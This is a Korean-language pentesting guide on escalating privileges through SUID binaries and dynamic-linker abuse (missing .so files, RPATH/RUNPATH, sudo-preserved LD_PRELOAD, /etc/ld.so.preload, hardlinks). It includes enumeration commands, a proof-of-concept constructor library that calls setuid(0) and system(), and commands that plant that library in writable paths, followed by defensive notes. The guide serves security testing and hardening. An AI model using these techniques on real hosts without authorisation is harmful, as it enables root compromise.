# SUID Shared Library 및 Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID 바이너리는 일반적으로 직접적인 command execution을 기준으로 검토하지만, custom SUID 프로그램은 dynamic linker를 통해서도 취약할 수 있습니다. 공통적인 핵심은 간단합니다. 권한이 있는 executable이 낮은 권한의 사용자가 영향을 줄 수 있는 path 또는 configuration에서 code를 로드한다는 것입니다.

이 페이지는 generic technique pattern에 초점을 둡니다: missing libraries, writable library directories, `RPATH`/`RUNPATH`, sudo를 통한 `LD_PRELOAD`, linker configuration, 그리고 SUID hardlink confusion입니다.

## 빠른 Enumeration

먼저 비정상적인 SUID 파일을 찾고, 해당 파일이 dynamically linked인지 확인합니다:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
비표준 위치, custom application 경로, package-managed 디렉터리 외부에 있는 root 소유 바이너리, 그리고 write 가능한 디렉터리에서 로드되는 dependencies에 집중하세요.

유용한 writeability 확인:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

일부 custom SUID binary는 존재하지 않는 shared object를 load하려고 시도합니다. 누락된 path가 attacker가 제어하는 directory 아래에 있다면, 해당 binary는 effective user 권한으로 attacker가 제공한 code를 load할 수 있습니다.

실패한 library lookup을 찾습니다:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
바이너리가 `libexample.so`를 찾기 위해 쓰기 가능한 경로를 검색한다면, 최소한의 proof library에서 constructor를 사용할 수 있습니다. 검증 중에는 영향 입증을 무해하게 유지하세요:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
바이너리가 로드하려는 정확한 파일 이름으로 빌드합니다:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
악용 가능한 조건은 library가 누락된 것만이 아닙니다. 공격자는 권한이 높은 loader가 허용하는 경로에 호환되는 shared object를 배치할 수 있어야 합니다.

## Writable Library Directory

때로는 모든 dependency가 존재하지만, dependency를 확인하는 데 사용되는 디렉터리 중 하나에 쓰기 권한이 있습니다. 이 경우 로드된 library를 교체하거나 동일한 이름의 우선순위가 더 높은 library를 심을 수 있습니다.

dependency 경로를 검토합니다:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
디렉터리에 쓰기 권한이 있다면, lab에서 copy-safe approach로 검증하세요. live host에서 system libraries를 교체하면 authentication, package management 또는 boot-critical services가 중단될 수 있습니다.

## RPATH 및 RUNPATH

`RPATH` 및 `RUNPATH`는 loader에게 libraries를 검색할 위치를 알려 주는 dynamic-section entries입니다. 공격자가 쓰기 가능한 directories를 가리키는 SUID programs에서는 위험합니다.

다음과 같이 탐지합니다:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
위험한 출력 예시:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
`/opt/app/lib`에 쓰기 권한이 있고 해당 바이너리가 `libcustom.so`를 필요로 하는 경우, 공격자는 그곳에 악성 `libcustom.so`를 배치할 수 있습니다:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH`와 `RUNPATH`는 모든 resolution 세부 사항에서 동일하지 않지만, privilege-escalation 검토에서 실질적인 질문은 동일합니다. SUID binary가 attacker가 쓰기 가능한 directory에서 library name을 검색하는가?

## LD_PRELOAD, LD_LIBRARY_PATH 및 SUID

일반적인 program에서는 `LD_PRELOAD`와 `LD_LIBRARY_PATH`를 사용하여 shared object loading을 강제하거나 이에 영향을 줄 수 있습니다. SUID program의 경우 dynamic loader는 일반적으로 secure-execution mode로 진입하며 위험한 environment variable을 무시합니다.

이는 사용자가 `LD_PRELOAD`를 설정할 수 있다는 이유만으로 일반적인 SUID binary가 보통 취약하지 않다는 의미입니다:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
일반적인 예외는 sudo misconfiguration입니다. `sudo -l`에서 `LD_PRELOAD` 또는 `LD_LIBRARY_PATH`와 같은 변수가 보존된다고 표시되면, sudo로 실행이 허용된 명령이 attacker-controlled code를 로드할 수 있습니다:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
다음 사례들을 혼동하지 마세요:

- 일반 SUID binary에 대한 `LD_PRELOAD`: 일반적으로 secure execution에 의해 차단됩니다.
- sudo에 의해 보존되는 `LD_PRELOAD`: 잠재적으로 exploit이 가능합니다.
- writable path에 누락된 `.so`: SUID binary가 해당 path를 정상적으로 load할 때 exploit이 가능합니다.
- writable directory를 가리키는 `RPATH`/`RUNPATH`: 필요한 library를 제어할 수 있을 때 exploit이 가능합니다.
- `/etc/ld.so.preload` 또는 linker config 쓰기 권한: system-wide이며 영향도가 높습니다.

## Linker Configuration

dynamic linker는 `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, linker cache와 같은 system configuration 및 일부 경우 `/etc/ld.so.preload`도 읽습니다.

High-value checks:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration is usually more serious than a single vulnerable SUID binary because it can affect many dynamically linked processes. `/etc/ld.so.preload` is especially dangerous because it can force a shared object into privileged processes.

## SUID Hardlink Confusion

Hardlink can make the same SUID inode appear under multiple names. This is useful for hiding a privileged helper, confusing cleanup, or bypassing naive path-based review.

둘 이상의 link를 가진 SUID 파일을 찾습니다:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
동일한 inode를 가리키는 모든 경로를 확인하세요:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
abuse는 hardlink가 권한을 변경한다는 의미가 아닙니다. abuse의 핵심은 path confusion입니다. 즉, 권한이 있는 inode가 방어 담당자나 스크립트가 예상하지 못하는 이름을 통해 접근 가능할 수 있습니다. inode 및 hardlink workflow에 대한 자세한 내용은 [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md)를 참조하세요.

## Defensive Notes

- 가능한 경우 SUID binaries를 최소화하고, 감사하며, package-managed 상태로 유지하세요.
- 쓰기 가능한 디렉터리나 application-managed 디렉터리를 가리키는 `RPATH`/`RUNPATH` 항목을 피하세요.
- library 디렉터리는 root 소유로 유지하고 일반 사용자가 쓸 수 없도록 하세요.
- sudo를 통해 `LD_PRELOAD`, `LD_LIBRARY_PATH` 또는 유사한 loader 변수가 유지되지 않도록 하세요.
- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` 및 예상하지 못한 SUID 파일을 모니터링하세요.
- hardlinked SUID 파일을 검토하고 표준 system path 외부에 있는 custom SUID wrapper를 조사하세요.

{{#include ../../banners/hacktricks-training.md}}
